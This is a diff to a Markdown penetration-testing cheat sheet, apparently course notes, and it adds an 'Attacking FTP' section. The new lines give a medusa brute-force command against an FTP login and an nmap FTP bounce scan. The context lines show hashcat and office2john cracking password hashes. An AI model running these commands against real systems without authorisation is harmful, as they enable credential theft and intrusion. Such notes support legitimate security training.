@@ -967,6 +967,14 @@ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.crack
 office2john.py Protected.docx > protected-docx.hash
 ```
 ## Attacking Common Services
+##### Attacking FTP
+```
+# Brute Forcing
+medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
+
+# FTP Bounce Attack
+nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
+```
 
 ##### Attacking SMB
 
